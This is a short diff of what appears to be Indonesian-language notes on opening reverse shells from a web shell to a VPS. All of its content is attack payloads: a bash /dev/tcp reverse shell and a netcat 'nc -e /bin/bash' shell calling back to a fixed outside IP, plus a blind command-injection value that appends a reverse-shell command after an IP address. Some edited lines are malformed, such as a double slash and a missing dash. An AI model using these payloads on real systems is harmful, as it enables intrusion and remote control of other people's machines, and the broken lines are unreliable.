@@ -9,7 +9,7 @@ Backconnect dari WebShell ke VPS dengan perintah:
 bash -i >& /dev/tcp/174.138.34.13/8080 0>&1
 
 Command Injection - blind
-127.0.0.1 && /bin/bash -c 'bash i >& /dev/tcp/192.168.85.246/1337 0>&1'
+172.22.223.154 && /bin/bash -c 'bash i >& /dev/tcp//174.138.34.13/8080 0>&1'
 
 2. Menggunakan Netcat (nc)
 nc -e /bin/bash 174.138.34.13 8080
